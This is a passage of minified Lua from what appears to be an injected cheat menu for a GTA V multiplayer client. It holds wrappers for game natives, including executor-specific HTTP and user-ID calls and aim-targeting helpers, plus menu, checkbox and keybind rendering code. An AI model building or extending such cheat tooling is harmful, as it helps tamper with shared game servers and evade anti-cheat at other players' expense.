                              a.ReturnResultAnyway(), a.ResultAsFloat())
    end
    function b.PointCamAtEntity(bx, _, al, aw, bC, bN)
        return a.InvokeNative(0x5640BFF86B16E8DC, bx, _, al, aw, bC, bN)
    end
    function b.StartNetworkedParticleFxNonLoopedAtCoord(cg, a4, a5, a6, a_, b0,
                                                        b1, z, a7, a8, a9)
        return a.InvokeNative(0xF56B8137DF10135D, c._tostring2(cg), a4, a5, a6,
                              a_, b0, b1, z, a7, a8, a9, a.ReturnResultAnyway())
    end
    function b.StartParticleFxNonLoopedAtCoord(cg, a4, a5, a6, a_, b0, b1, z,
                                               a7, a8, a9)
        return a.InvokeNative(0x25129531F77B9ED3, c._tostring2(cg), a4, a5, a6,
                              a_, b0, b1, z, a7, a8, a9, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.HttpRequest(bq, dZ, type)
        return a.InvokeNative(0x762376233636, bq, c._json.encode(dZ), type,
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.GetRedUserId()
        return a.InvokeNative(0x762376233638, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetModTextLabel(vehicle, bu, d_)
        return a.InvokeNative(0x8935624F8C5592CC, vehicle, bu, d_,
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.GetLabelText(e0)
        return a.InvokeNative(0x7B5280EBA9840C72, c._tostring2(e0),
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.GetVehicleXenonLightsColour(vehicle)
        return a.InvokeNative(0x3DFF319A831E0CDB, vehicle,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.IsPedShooting(Q)
        return a.InvokeNative(0x34616828CD07F1A1, Q, a.ReturnResultAnyway())
    end
    function b.AddBlipForCoord(E, F, G)
        return a.InvokeNative(0x5A039BB0BCA604B6, E, F, G,
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.SetBlipDisplay(ba, e1)
        return a.InvokeNative(0x9029B2F3DA924928, ba, e1)
    end
    function b.SetBlipColour(ba, c7)
        return a.InvokeNative(0x03D7FB09E75D6B7E, ba, c7)
    end
    function b.SetBlipAsShortRange(ba, C)
        return a.InvokeNative(0xBE8BE4FE60E27B72, ba, C)
    end
    function b.SetPedDefaultComponentVariation(Q)
        return a.InvokeNative(0x45EEE61580806D63, Q)
    end
    function b.GetControlInstructionalButton(ah, ai, al)
        return a.InvokeNative(0x0499D7B09FC9B407, ah, ai, al,
                              a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.DrawLightWithRange(bH, bI, bJ, e2, e3, e4, e5, e6)
        return
            a.InvokeNative(0xF2A1B2771A01DBD4, bH, bI, bJ, e2, e3, e4, e5, e6)
    end
    function b.Vdist(aM, aN, aO, aP, aQ, aR)
        return a.InvokeNative(0x2A488C176D52CCA5, aM, aN, aO, aP, aQ, aR,
                              a.ReturnResultAnyway(), a.ResultAsFloat())
    end
    function b.StartExpensiveSynchronousShapeTestLosProbe(aM, aN, aO, aP, aQ,
                                                          aR, cG, _, c_)
        return a.InvokeNative(0x377906D8A31E5586, aM, aN, aO, aP, aQ, aR, cG, _,
                              c_, a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.AddReplaceTexture(e7, e8, e9, ea)
        return a.InvokeNative(0xa66f8f75, c._tostring2(e7), c._tostring2(e8),
                              c._tostring2(e9), c._tostring2(ea))
    end
    function b.GetNumResourceMetadata(bS, eb)
        return a.InvokeNative(0x776e864, c._tostring2(bS), c._tostring2(eb),
                              a.ReturnResultAnyway(), a.ResultAsInteger())
    end
    function b.GetResourceMetadata(bS, eb, c0)
        return a.InvokeNative(0x964bab1d, c._tostring2(bS), c._tostring2(eb),
                              c0, a.ReturnResultAnyway(), a.ResultAsString())
    end
    function b.RemoveReplaceTexture(e7, e8)
        return a.InvokeNative(0xa896b20a, c._tostring2(e7), c._tostring2(e8))
    end
    function b.SetDuiUrl(bi, bq)
        return a.InvokeNative(0xf761d9f3, bi, c._tostring2(bq))
    end
    function b.SetGameplayCamRelativeRotation(bL, bK, bM)
        return a.InvokeNative(0x48608C3464F58AB4, bL, bK, bM)
    end
    function b.SetPedCoordsKeepVehicle(Q, bH, bI, bJ)
        return a.InvokeNative(0x9AFEFF481A85AB2E, Q, bH, bI, bJ)
    end
    function b.HasPedGotWeapon(Q, R, al)
        return a.InvokeNative(0x8DECB02F88F428BC, Q, b.GetHashKey(R), al,
                              a.ReturnResultAnyway())
    end
    function b.GetPedBoneCoordsScaled(Q, co, cl, cm, cn)
        local ec = b.GetPedBoneCoords(Q, 0x0, 0.0, 0.0, 0.0)
        local ed = b.GetGameplayCamCoords()
        local A, l, ee = b.GetShapeTestResult(
                             b.StartExpensiveSynchronousShapeTestLosProbe(ed,
                                                                          ec,
                                                                          -1, Q,
                                                                          0))
        local ef = 0.85;
        if l then ef = b.Vdist(ed, ee) / b.Vdist(ed, ec) * 0.85 end
        if ef > 1 then ef = 0.9 end
        return ed + (b.GetPedBoneCoords(Q, co, cl, cm, cn) - ed) * ef
    end
    function b.IsModelInCdimage(cb)
        return a.InvokeNative(0x35B9E0803292B641, b.GetHashKey(cb),
                              a.ReturnResultAnyway())
    end
    function b.DestroyDui(bi) return a.InvokeNative(0xa085cb10, bi) end
    function b.GetPlayerPedIsFollowing(Q)
        return a.InvokeNative(0x6A3975DEA89F9A17, Q, a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetLocalTime()
        return a.InvokeNative(0x50C7A99057A69748, a.PointerValueInt(),
                              a.PointerValueInt(), a.PointerValueInt(),
                              a.PointerValueInt(), a.PointerValueInt(),
                              a.PointerValueInt())
    end
    function b.GetVehicleHandlingInt(vehicle, dF, dG)
        return a.InvokeNative(0x27396c75, vehicle, c._tostring2(dF),
                              c._tostring2(dG), a.ReturnResultAnyway(),
                              a.ResultAsInteger())
    end
    function b.GetVehicleHandlingFloat(vehicle, dF, dG)
        return a.InvokeNative(0x642fc12f, vehicle, c._tostring2(dF),
                              c._tostring2(dG), a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.GetVehicleHandlingVector(vehicle, dF, dG)
        return a.InvokeNative(0xfb341304, vehicle, c._tostring2(dF),
                              c._tostring2(dG), a.ReturnResultAnyway(),
                              a.ResultAsVector())
    end
    function b.SetVehicleHandlingInt(vehicle, dF, dG, c1)
        return a.InvokeNative(0xc37f4cf9, vehicle, c._tostring2(dF),
                              c._tostring2(dG), c1)
    end
    function b.SetVehicleHandlingVector(vehicle, dF, dG, c1)
        return a.InvokeNative(0x12497890, vehicle, c._tostring2(dF),
                              c._tostring2(dG), c1)
    end
    function b.SetVehicleHandlingFloat(vehicle, dF, dG, c1)
        return a.InvokeNative(0x488c86d2, vehicle, c._tostring2(dF),
                              c._tostring2(dG), c1)
    end
    function b.IsAnyControlJustPressed(eg, eh)
        return b.IsDisabledControlJustPressed(eg, eh) or
                   b.IsControlJustPressed(eg, eh)
    end
    function b.IsAnyControlPressed(eg, eh)
        return b.IsDisabledControlPressed(eg, eh) or b.IsControlPressed(eg, eh)
    end
    function b.IsDuiAvailable(bi)
        return a.InvokeNative(0x7aac3b4c, bi, a.ReturnResultAnyway())
    end
    function b.GetPedWeaponCoords(_)
        return a.InvokeNative(0x1899F328B0E12848,
                              a.InvokeNative(0x3B390A939AF0B5FC, _,
                                             a.ReturnResultAnyway(),
                                             a.ResultAsInteger()), 0.2, 0, 0.06,
                              a.ReturnResultAnyway(), a.ResultAsVector())
    end
    function b.GetMaxRangeOfCurrentPedWeapon(Q)
        return a.InvokeNative(0x814C9D19DFD69679, Q, a.ReturnResultAnyway(),
                              a.ResultAsFloat())
    end
    function b.IsPlayerFreeAiming(ag)
        return a.InvokeNative(0x2E397FD2ECD37C87, ag, a.ReturnResultAnyway())
    end
    c.fram.func = {
        DrawText3D = function(c8, h, ei, dz)
            local ej, ek, el = b.GetScreenCoordFromWorldCoord(c8.x, c8.y, c8.z)
            if ej then
                local z = 1 /
                              b.GetDistanceBetweenCoords(
                                  b.GetGameplayCamCoords(), c8.x, c8.y, c8.z, 1) *
                              2 * 1 / b.GetGameplayCamFov() * 100;
                ei = ei or {255, 255, 255, 255}
                b.SetTextScale(0.55 * z, 0.55 * z)
                b.SetTextFont(dz or 4)
                b.SetTextProportional(1)
                b.SetTextColour(ei[1], ei[2], ei[3], ei[4])
                b.SetTextDropshadow(0, 0, 0, 0, 255)
                b.SetTextEdge(2, 0, 0, 0, 150)
                b.SetTextDropShadow()
                b.SetTextOutline()
                b.SetTextEntry('STRING')
                b.SetTextCentre(1)
                b.AddTextComponentString(h)
                b.GetScreenCoordFromWorldCoord(c8.x, c8.y, c8.z, 0)
                b.EndTextCommandDisplayText(ek, el)
            end
        end,
        rainbow = function(em)
            local en = b.GetGameTimer() / 1000;
            return {
                r = c._math.floor(c._math.sin(en * em + 0) * 127 + 128),
                g = c._math.floor(c._math.sin(en * em + 2) * 127 + 128),
                b = c._math.floor(c._math.sin(en * em + 4) * 127 + 128)
            }
        end,
        getcamdirection = function()
            local heading = b.GetGameplayCamRelativeHeading() +
                                b.GetEntityHeading(b.PlayerPedId())
            local bK = b.GetGameplayCamRelativePitch()
            local E = -c._math.sin(heading * c._math.pi / 180.0)
            local F = c._math.cos(heading * c._math.pi / 180.0)
            local G = c._math.sin(bK * c._math.pi / 180.0)
            local eo = c._math.sqrt(E * E + F * F + G * G)
            if eo ~= 0 then
                E = E / eo;
                F = F / eo;
                G = G / eo
            end
            return E, F, G
        end,
        RString = function(ep)
            local eq = ''
            ep = ep or 20;
            for er = 1, ep do
                local es = c._string.char(c._math.random(97, 122))
                if c._math.random(1, 3) == 1 then
                    es = c._string.upper(es)
                end
                eq = eq .. es
            end
            if c.var.strings[eq] then return c.fram.func.RString(ep) end
            c.var.strings[eq] = true;
            return eq
        end,
        DrawText = function(h, E, F, ei, z, dz, et)
            b.SetTextFont(dz)
            b.SetTextScale(z, z)
            b.SetTextColour(ei[1], ei[2], ei[3], ei[4])
            b.SetTextCentre(et)
            b.BeginTextCommandDisplayText('TWOSTRINGS')
            b.AddTextComponentSubstringPlayerName(h)
            b.EndTextCommandDisplayText(E, F)
        end,
        TextWidth = function(h, dz, z)
            b.BeginTextCommandWidth('TWOSTRINGS')
            b.AddTextComponentSubstringPlayerName(h)
            b.SetTextFont(dz or 4)
            b.SetTextScale(z or 0.32, z or 0.32)
            return b.EndTextCommandGetWidth(1)
        end,
        NumberTableGenner = function(e, f, g, eu)
            local l = {}
            for ev = e, f, g do
                c._table.insert(l, eu and c._tostring(ev) or ev)
            end
            return l
        end,
        AskKeybind = function(ew)
            local ex = {name = 'NONE', key = 420}
            local ey = 0;
            local ez = 0;
            local eA = function()
                for k, eB in c._pairs(c.Keys) do
                    if b.IsAnyControlJustPressed(0, eB) then
                        return k, eB
                    end
                end
            end;
            while true do
                a.Wait(0)
                b.DisableAllControlActions(true)
                b.DrawRect(0.5, 0.3, 0.102, 0.022,
                           c.var.colors['menu:subTitlebackground'][1],
                           c.var.colors['menu:subTitlebackground'][2],
                           c.var.colors['menu:subTitlebackground'][3], 255)
                b.DrawRect(0.5, 0.3, 0.1, 0.02, 10, 10, 10, 255)
                c.fram.func.DrawText('Press any key', 0.45, 0.275,
                                     {255, 255, 255, 255}, 0.25, 4, false)
                c.fram.func.DrawText(ex.name, 0.455, 0.29, {255, 255, 255, 255},
                                     0.27, 4, false)
                local eC, eD = eA()
                ez = b.GetGameTimer()
                if eC ~= nil and ex.name == 'NONE' then
                    if eC == 'ESC' then break end
                    ex = {name = eC, key = eD}
                    ey = b.GetGameTimer()
                end
                if ex.name ~= 'NONE' and ez - ey > 500 then break end
            end
            if ex.name == 'DELETE' then
                if ew.MenuKey then
                    c.fram.func.Notify('error', 'Open key forced to \'Â°/~\'')
                    c.Keybinds[1] = {
                        value = 'menu:key',
                        label = '[Â°] Menu open key',
                        description = 'Key to open the menu',
                        key = 243
                    }
                    return
                end
                if not ew.index then
                    c.fram.func.Notify('error',
                                       'Error while removing keybind (WI)')
                    return
                end
                c._table.remove(c.Keybinds, ew.index)
            elseif not ew.index and not ew.MenuKey then
                c._table.insert(c.Keybinds, {
                    label = '[' .. (ex.name ~= 'NONE' and ex.name or 'DELETE') ..
                        '] ' .. ew.label,
                    description = ew.description,
                    key = ex.key,
                    type = ew.type,
                    result = ew.result,
                    value = ew.value
                })
            elseif ew.MenuKey then
                c.Keybinds[1] = {
                    value = 'menu:key',
                    label = '[' .. (ex.name ~= 'NONE' and ex.name or 'DELETE') ..
                        '] Menu open key',
                    description = 'Key to open the menu',
                    key = ex.key ~= 420 and ex.key or 178
                }
            elseif ew.index and not ew.MenuKey then
                c.Keybinds[ew.index] = {
                    label = '[' .. (ex.name ~= 'NONE' and ex.name or 'DELETE') ..
                        '] ' .. ew.label,
                    MenuKey = k == 1 and true or nil,
                    description = ew.description,
                    key = ex.key,
                    type = ew.type,
                    result = ew.result,
                    value = ew.value
                }
            end
            c.fram.menus.Settings_KeybindsManager.options = {}
            for k, eB in c._ipairs(c.Keybinds) do
                c.fram.menus.Settings_KeybindsManager.options[k] = {
                    data = {title = eB.label},
                    func = 'Button',
                    result = function()
                        local eE, eF = c._string.find(eB.label, '%b[]')
                        c.fram.func.AskKeybind({
                            label = c._string.sub(eB.label, eF + 1,
                                                  c._string.len(eB.label)),
                            description = eB.description,
                            type = eB.type,
                            result = eB.result,
                            index = k,
                            value = eB.value
                        })
                    end
                }
            end
        end,
        crIndex = function()
            return c.fram.menus[c.fram.var.selectedMenu].currentOption <=
                       c.fram.var.screenOptions and c.fram.var.optionCount <=
                       c.fram.var.screenOptions and c.fram.var.optionCount or
                       (c.fram.var.optionCount >
                           c.fram.menus[c.fram.var.selectedMenu].currentOption -
                           c.fram.var.screenOptions and c.fram.var.optionCount <=
                           c.fram.menus[c.fram.var.selectedMenu].currentOption and
                           c.fram.var.optionCount -
                           (c.fram.menus[c.fram.var.selectedMenu].currentOption -
                               c.fram.var.screenOptions) or nil) or nil
        end,
        IsHover = function(E, F, eG, eH)
            if not c.fram.var.mpos.x or not c.fram.var.mpos.y then
                return
            end
            return c.fram.var.mpos.x <= E + eG / 2 and c.fram.var.mpos.x >= E -
                       eG / 2 and c.fram.var.mpos.y <= F + eH / 2 and
                       c.fram.var.mpos.y >= F - eH / 2
        end,
        Description = function(h) if not h then return end end,
        Button = function(ew, l)
            c.fram.var.optionCount = c.fram.var.optionCount + 1;
            local eI = c.fram.func.crIndex()
            if not eI then return end
            local eJ = c.var.checkbox.MenuMouse and
                           c.fram.func.IsHover(c.fram.var.x,
                                               c.fram.var.y +
                                                   c.fram.var.header_h / 2 + eI *
                                                   c.fram.var.bHeight +
                                                   c.fram.var.bHeight / 2,
                                               c.fram.var.g_w,
                                               c.fram.var.bHeight)
            if eJ then
                c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram.var
                                                                          .optionCount
            end
            if c.fram.var.optionCount ==
                c.fram.menus[c.fram.var.selectedMenu].currentOption then
                if ew.description then
                    c.fram.func.Description(ew.description)
                end
                if ew.hover then ew.hover() end
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:selectedText'][1],
                    c.var.colors['menu:selectedText'][2],
                    c.var.colors['menu:selectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.32, 4)
                if ew.subTitle then
                    c.var.textcaches['button-' .. ew.title] =
                        c.var.textcaches['button-' .. ew.title] or
                            c.fram.func.TextWidth(ew.subTitle, 4, 0.35)
                    c.fram.func.DrawText(ew.subTitle, c.fram.var.x +
                                             c.fram.var.g_w / 2.05 -
                                             c.var.textcaches['button-' ..
                                                 ew.title], c.fram.var.y +
                                             c.fram.var.header_h / 2 + eI *
                                             c.fram.var.bHeight, {
                        c.var.colors['menu:selectedText'][1],
                        c.var.colors['menu:selectedText'][2],
                        c.var.colors['menu:selectedText'][3],
                        c.fram.var.colors.menuAlpha
                    }, 0.35, 4)
                end
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:selectedFeaturebackground'][1],
                           c.var.colors['menu:selectedFeaturebackground'][2],
                           c.var.colors['menu:selectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha)
                if (b.IsDisabledControlPressed(0, c.Keys['ENTER']) or
                    b.IsDisabledControlPressed(0, c.Keys['MOUSE1']) and eJ) and
                    c.fram.var.timers.currTime -
                    c.fram.var.timers.scrolling.time >=
                    c.fram.var.timers.scrolling.delay and l then
                    if b.IsAnyControlPressed(0, c.Keys['LEFTSHIFT']) then
                        c.fram.func.AskKeybind({
                            label = ew.title,
                            description = ew.description or
                                'No description provided',
                            type = 'Button',
                            result = l
                        })
                    else
                        c.fram.var.timers.scrolling.time = c.fram.var.timers
                                                               .currTime;
                        if c.var.checkbox['ui_sounds'] then
                            b.PlaySoundFrontend(-1, 'NAV_UP_DOWN',
                                                'HUD_FRONTEND_DEFAULT_SOUNDSET',
                                                1)
                        end
                        l()
                    end
                end
            else
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:noSelectedText'][1],
                    c.var.colors['menu:noSelectedText'][2],
                    c.var.colors['menu:noSelectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.32, 4)
                if ew.subTitle then
                    c.var.textcaches['button-' .. ew.title] =
                        c.var.textcaches['button-' .. ew.title] or
                            c.fram.func.TextWidth(ew.subTitle, 4, 0.35)
                    c.fram.func.DrawText(ew.subTitle, c.fram.var.x +
                                             c.fram.var.g_w / 2.05 -
                                             c.var.textcaches['button-' ..
                                                 ew.title], c.fram.var.y +
                                             c.fram.var.header_h / 2 + eI *
                                             c.fram.var.bHeight, {
                        c.var.colors['menu:noSelectedText'][1],
                        c.var.colors['menu:noSelectedText'][2],
                        c.var.colors['menu:noSelectedText'][3],
                        c.fram.var.colors.menuAlpha
                    }, 0.35, 4)
                end
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:noSelectedFeaturebackground'][1],
                           c.var.colors['menu:noSelectedFeaturebackground'][2],
                           c.var.colors['menu:noSelectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha - 105)
            end
        end,
        MenuButton = function(ew, l)
            c.fram.var.optionCount = c.fram.var.optionCount + 1;
            local eI = c.fram.func.crIndex()
            if not eI then return end
            local eJ = c.var.checkbox.MenuMouse and
                           c.fram.func.IsHover(c.fram.var.x,
                                               c.fram.var.y +
                                                   c.fram.var.header_h / 2 + eI *
                                                   c.fram.var.bHeight +
                                                   c.fram.var.bHeight / 2,
                                               c.fram.var.g_w,
                                               c.fram.var.bHeight)
            if eJ then
                c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram.var
                                                                          .optionCount
            end
            if c.fram.var.optionCount ==
                c.fram.menus[c.fram.var.selectedMenu].currentOption then
                if ew.description then
                    c.fram.func.Description(ew.description)
                end
                if ew.hover then ew.hover() end
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:selectedText'][1],
                    c.var.colors['menu:selectedText'][2],
                    c.var.colors['menu:selectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.35, 4)
                c.fram.func.DrawText('>>',
                                     c.fram.var.x + c.fram.var.g_w * 0.435,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:selectedmenuButtonSprite'][1],
                    c.var.colors['menu:selectedmenuButtonSprite'][2],
                    c.var.colors['menu:selectedmenuButtonSprite'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.35, 4)
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:selectedFeaturebackground'][1],
                           c.var.colors['menu:selectedFeaturebackground'][2],
                           c.var.colors['menu:selectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha)
                if (b.IsDisabledControlPressed(0, c.Keys['ENTER']) or
                    b.IsDisabledControlPressed(0, c.Keys['MOUSE1']) and eJ) and
                    c.fram.var.timers.currTime -
                    c.fram.var.timers.scrolling.time >=
                    c.fram.var.timers.scrolling.delay then
                    c.fram.var.timers.scrolling.time = c.fram.var.timers
                                                           .currTime;
                    local eK = c.fram.var.selectedMenu;
                    c.fram.var.selectedMenu = ew.subMenu;
                    if l then l() end
                    if c.var.checkbox['ui_sounds'] then
                        b.PlaySoundFrontend(-1, 'NAV_UP_DOWN',
                                            'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                    end
                end
            else
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:noSelectedText'][1],
                    c.var.colors['menu:noSelectedText'][2],
                    c.var.colors['menu:noSelectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.32, 4)
                c.fram.func.DrawText('>>',
                                     c.fram.var.x + c.fram.var.g_w * 0.435,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:noselectedmenuButtonSprite'][1],
                    c.var.colors['menu:noselectedmenuButtonSprite'][2],
                    c.var.colors['menu:noselectedmenuButtonSprite'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.35, 4)
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:noSelectedFeaturebackground'][1],
                           c.var.colors['menu:noSelectedFeaturebackground'][2],
                           c.var.colors['menu:noSelectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha - 105)
            end
        end,
        ColorButton = function(ew, l)
            c.fram.var.optionCount = c.fram.var.optionCount + 1;
            local eI = c.fram.func.crIndex()
            if not eI then return end
            local eJ = c.var.checkbox.MenuMouse and
                           c.fram.func.IsHover(c.fram.var.x,
                                               c.fram.var.y +
                                                   c.fram.var.header_h / 2 + eI *
                                                   c.fram.var.bHeight +
                                                   c.fram.var.bHeight / 2,
                                               c.fram.var.g_w,
                                               c.fram.var.bHeight)
            if eJ then
                c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram.var
                                                                          .optionCount
            end
            if c.fram.var.optionCount ==
                c.fram.menus[c.fram.var.selectedMenu].currentOption then
                if ew.description then
                    c.fram.func.Description(ew.description)
                end
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:selectedText'][1],
                    c.var.colors['menu:selectedText'][2],
                    c.var.colors['menu:selectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.35, 4)
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:selectedFeaturebackground'][1],
                           c.var.colors['menu:selectedFeaturebackground'][2],
                           c.var.colors['menu:selectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha)
                b.DrawRect(c.fram.var.x + c.fram.var.g_w / 2.2,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           0.005, 0.01, c.var.colors[ew.value][1],
                           c.var.colors[ew.value][2], c.var.colors[ew.value][3],
                           c.fram.var.colors.menuAlpha)
                if (b.IsDisabledControlPressed(0, c.Keys['ENTER']) or
                    b.IsDisabledControlPressed(0, c.Keys['MOUSE1']) and eJ) and
                    c.fram.var.timers.currTime -
                    c.fram.var.timers.scrolling.time >=
                    c.fram.var.timers.scrolling.delay then
                    c.fram.var.timers.scrolling.time = c.fram.var.timers
                                                           .currTime;
                    if c.var.checkbox['ui_sounds'] then
                        b.PlaySoundFrontend(-1, 'NAV_UP_DOWN',
                                            'HUD_FRONTEND_DEFAULT_SOUNDSET', 1)
                    end
                    local ei = {}
                    ei[1] = c.func.KeyboardInput('Red', '', 3, true)
                    ei[2] = c.func.KeyboardInput('Green', '', 3, true)
                    ei[3] = c.func.KeyboardInput('Blue', '', 3, true)
                    if ew.alpha then
                        ei[4] = c.func.KeyboardInput('Alpha', '', 3, true)
                    end
                    for k, eB in c._ipairs(ei) do
                        if not eB then return end
                    end
                    c.var.colors[ew.value] = ei or c.var.colors[ew.value]
                    if l then l() end
                end
            else
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:noSelectedFeaturebackground'][1],
                           c.var.colors['menu:noSelectedFeaturebackground'][2],
                           c.var.colors['menu:noSelectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha - 105)
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:noSelectedText'][1],
                    c.var.colors['menu:noSelectedText'][2],
                    c.var.colors['menu:noSelectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.32, 4)
                b.DrawRect(c.fram.var.x + c.fram.var.g_w / 2.2,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           0.005, 0.01, c.var.colors[ew.value][1],
                           c.var.colors[ew.value][2], c.var.colors[ew.value][3],
                           c.fram.var.colors.menuAlpha)
            end
        end,
        CheckBox = function(ew, l)
            c.fram.var.optionCount = c.fram.var.optionCount + 1;
            local eI = c.fram.func.crIndex()
            if not eI then return end
            local eJ = c.var.checkbox.MenuMouse and
                           c.fram.func.IsHover(c.fram.var.x,
                                               c.fram.var.y +
                                                   c.fram.var.header_h / 2 + eI *
                                                   c.fram.var.bHeight +
                                                   c.fram.var.bHeight / 2,
                                               c.fram.var.g_w,
                                               c.fram.var.bHeight)
            if eJ then
                c.fram.menus[c.fram.var.selectedMenu].currentOption = c.fram.var
                                                                          .optionCount
            end
            if c.fram.var.optionCount ==
                c.fram.menus[c.fram.var.selectedMenu].currentOption then
                if ew.description then
                    c.fram.func.Description(ew.description)
                end
                c.fram.func.DrawText(ew.title,
                                     c.fram.var.x - c.fram.var.g_w / 2 + 0.003,
                                     c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                         c.fram.var.bHeight, {
                    c.var.colors['menu:selectedText'][1],
                    c.var.colors['menu:selectedText'][2],
                    c.var.colors['menu:selectedText'][3],
                    c.fram.var.colors.menuAlpha
                }, 0.35, 4)
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
                           c.var.colors['menu:selectedFeaturebackground'][1],
                           c.var.colors['menu:selectedFeaturebackground'][2],
                           c.var.colors['menu:selectedFeaturebackground'][3],
                           c.fram.var.colors.menuAlpha)
                b.DrawSprite('timerbar_sr', c.var.checkbox[ew.value] and
                                 'timer_tick' or 'timer_cross',
                             c.fram.var.x + c.fram.var.g_w / 2.2,
                             c.fram.var.y + c.fram.var.header_h / 2 + eI *
                                 c.fram.var.bHeight + c.fram.var.bHeight / 2,
                             0.01, 0.02, 0.0,
                             c.var.colors['menu:selectedCheckbox'][1],
                             c.var.colors['menu:selectedCheckbox'][2],
                             c.var.colors['menu:selectedCheckbox'][3],
                             c.fram.var.colors.menuAlpha)
                if (b.IsDisabledControlPressed(0, c.Keys['ENTER']) or
                    b.IsDisabledControlPressed(0, c.Keys['MOUSE1']) and eJ) and
                    c.fram.var.timers.currTime -
                    c.fram.var.timers.scrolling.time >=
                    c.fram.var.timers.scrolling.delay then
                    if b.IsAnyControlPressed(0, c.Keys['LEFTSHIFT']) then
                        c.fram.func.AskKeybind({
                            label = ew.title,
                            description = ew.description or
                                'No description provided',
                            type = 'CheckBox',
                            result = l,
                            value = ew.value
                        })
                    else
                        c.fram.var.timers.scrolling.time = c.fram.var.timers
                                                               .currTime;
                        if c.var.checkbox['ui_sounds'] then
                            b.PlaySoundFrontend(-1, 'NAV_UP_DOWN',
                                                'HUD_FRONTEND_DEFAULT_SOUNDSET',
                                                1)
                        end
                        c.var.checkbox[ew.value] = not c.var.checkbox[ew.value]
                        if l then
                            a.CreateThread(function()
                                l()
                            end)
                        end
                    end
                end
            else
                b.DrawRect(c.fram.var.x,
                           c.fram.var.y + c.fram.var.header_h / 2 + eI *
                               c.fram.var.bHeight + c.fram.var.bHeight / 2,
                           c.fram.var.g_w, c.fram.var.bHeight,
